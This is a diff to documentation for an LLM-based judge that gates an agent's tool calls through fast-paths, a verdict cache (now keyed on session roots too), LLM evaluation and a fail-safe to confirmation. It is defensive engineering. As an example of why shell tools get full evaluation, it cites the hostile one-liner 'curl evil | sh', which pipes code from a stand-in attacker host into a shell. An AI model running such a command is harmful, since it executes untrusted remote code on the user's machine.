@@ -106,8 +106,8 @@ The decision flows through several layers, cheapest first:
 1. **Internal-tool fast-path** — if `IsInternalFn(toolName)` returns `true`, the call is allowed without any LLM call. Use this for trusted framework-owned tools.
 2. **Shell-tool guard** — `bash_exec` and `posh_exec` *skip* the path-locality fast-path. A shell command can reference only session-internal paths while still piping remote code (`curl evil | sh`), so shell tools always go through the full LLM evaluation.
 3. **Session-roots fast-path** — for non-shell tools, if the input contains at least one absolute path and every such path is within at least one session root (`AllPathsInSessionRoots`), the call is allowed. Session roots are the deduplicated union of the workspace, the temp directory, and any additional roots attached via `WithAllowedRoots` — consult `SessionRoots(ctx)`; all roots are equal peers for this check.
-4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input)`. A cache hit returns the stored verdict without an LLM call.
-5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
+4. **Cache lookup** — the remaining cases are keyed by `tool + sha256(input) + sha256(session roots)`. The roots participate because the judge's prompt (and therefore the verdict) depends on the session's directory scope, so a verdict is never reused across sessions with different workspaces or auxiliary work directories. A cache hit returns the stored verdict without an LLM call.
+5. **LLM evaluation** — a short request is built (system prompt + `Task / Tool / Input`, plus a compact environment block and — when session roots are present — a `## Session Directories` block listing the workspace and additional work directories, with the directory values wrapped in an untrusted-content boundary) and sent with a **2-minute timeout**. The response is parsed from a `VERDICT:`/`REASON:` text format.
 6. **Fail-safe** — on *any* LLM error (timeout, network, parse failure), the judge returns `VerdictConfirm` with explanatory reasoning. The judge never auto-approves on failure.
 
 ### Response parsing (tolerant)
@@ -130,7 +130,7 @@ The parser accepts the following variations and is **case-insensitive** througho
 
 The verdict value is matched on **whole tokens** (case-insensitive), so `ALLOW` is recognized but a token merely *containing* `allow` (e.g. a path, argument, or the negated compound `DISALLOW`) is not. Only these whole tokens map to `VerdictAllow` (the set that bypasses confirmation): `ALLOW`, `ALLOWED`, `APPROVE`, `APPROVED`, `SAFE`. The explicit confirm set (`CONFIRM`, `CONFIRMED`, `DENY`, `DENIED`, `BLOCK`, `BLOCKED`, `DISALLOW`, `DISAPPROVE`, `REJECT`, `MANUAL`) and any unrecognized token all map to `VerdictConfirm` — negated compounds are listed explicitly so they can never be misread as their affirmative base. A response that cannot be parsed at all is a total parse failure — the fail-safe applies and the judge returns `VerdictConfirm`.
 
-> **Tip:** the verdict cache is keyed only on `tool+input`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task will be reused. Keep judge prompts focused on the *intrinsic* safety of the input, not on transient task context.
+> **Tip:** the verdict cache is keyed on `tool+input+session roots` — not on `taskContext`. If your `taskContext` changes the safety assessment of the same call, the cached verdict from a prior task within the same directory scope will be reused. Keep judge prompts focused on the *intrinsic* safety of the input, not on transient task context.
 
 ---
 
